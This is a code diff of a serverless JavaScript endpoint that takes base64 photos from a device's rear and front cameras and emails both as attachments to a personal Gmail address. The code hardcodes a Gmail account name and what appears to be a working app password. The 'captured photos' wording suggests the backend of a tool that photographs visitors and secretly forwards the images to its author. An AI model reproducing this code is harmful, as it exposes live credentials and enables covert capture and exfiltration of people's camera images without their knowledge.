@@ -9,30 +9,22 @@ module.exports = async (req, res) => {
   // Ensure it's a POST request
   if (req.method === 'POST') {
     try {
-      // If the body is not automatically parsed, we parse it manually
+      // Parse the body if it's a string
       let body = req.body;
-
-      // If no body is received, return an error
-      if (!body) {
-        console.log('No body received');
-        return res.status(400).json({ success: false, message: 'No body received' });
-      }
-
-      // If Vercel doesn't parse JSON automatically, we can manually parse it
       if (typeof body === 'string') {
-        body = JSON.parse(body);  // Parse the JSON string if needed
+        body = JSON.parse(body);
       }
 
-      // Log the entire request body to verify what is received
+      // Log the body to verify input
       console.log('Request Body:', body);
 
-      // Extract photo from the body
-      let photo = body.photo;
+      // Extract rearPhoto and frontPhoto from the request
+      const { rearPhoto, frontPhoto } = body;
 
-      // If no photo is received, send an error response
-      if (!photo) {
-        console.log('No photo data received');
-        return res.status(400).json({ success: false, message: 'No photo data received' });
+      // Ensure both photos are provided
+      if (!rearPhoto || !frontPhoto) {
+        console.log('Missing photo data');
+        return res.status(400).json({ success: false, message: 'Missing photo data' });
       }
 
       // Set up the transporter for sending the email
@@ -40,20 +32,25 @@ module.exports = async (req, res) => {
         service: 'gmail',
         auth: {
           user: 'aleksadiscord1@gmail.com',
-          pass: 'vamrkaxmpltrifsf', // Use your actual app password here
+          pass: 'vamrkaxmpltrifsf', // Replace with your app password
         },
       });
 
-      // Set up email options with the base64 image as an attachment
+      // Email options with both photos as attachments
       const mailOptions = {
         from: 'aleksadiscord1@gmail.com',
         to: 'aleksatomic2008@gmail.com',
-        subject: 'Captured Photo',
-        text: 'Here is the captured photo.',
+        subject: 'Captured Photos',
+        text: 'Here are the captured photos from rear and front cameras.',
         attachments: [
           {
-            filename: 'photo.jpg',
-            content: photo.split(';base64,')[1],  // Remove the base64 prefix to get pure base64 content
+            filename: 'rearPhoto.jpg',
+            content: rearPhoto.split(';base64,')[1], // Extract base64 content
+            encoding: 'base64',
+          },
+          {
+            filename: 'frontPhoto.jpg',
+            content: frontPhoto.split(';base64,')[1], // Extract base64 content
             encoding: 'base64',
           },
         ],
@@ -64,7 +61,7 @@ module.exports = async (req, res) => {
       // Send the email
       await transporter.sendMail(mailOptions);
       console.log('Email sent successfully');
-      return res.status(200).json({ success: true, message: 'Photo sent successfully!' });
+      return res.status(200).json({ success: true, message: 'Photos sent successfully!' });
     } catch (error) {
       console.error('Error processing request:', error);
       return res.status(500).json({ success: false, message: 'Internal server error', error: error.message });
